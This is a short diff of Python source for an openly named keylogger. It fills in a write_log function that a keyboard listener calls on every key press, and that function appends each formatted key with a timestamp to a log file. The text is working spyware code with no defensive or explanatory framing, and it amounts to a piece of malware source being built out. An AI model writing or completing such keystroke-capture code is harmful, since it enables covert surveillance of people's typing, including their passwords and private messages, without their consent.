@@ -31,7 +31,14 @@ def format_key(key):
         return special_keys.get(key, f'[{key.name.upper()}]')
 
 def write_log(key):
-    pass
+    key_str = format_key(key)
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    with open(LOG_FILE, "a", encoding="utf-8") as log_file:
+        if key_str == '\n':
+            log_file.write('\n')  # Line break without timestamp
+        else:
+            log_file.write(f"{timestamp} - {key_str}\n")
 
 def start_keylogger():
     with keyboard.Listener(on_press=write_log) as listener:
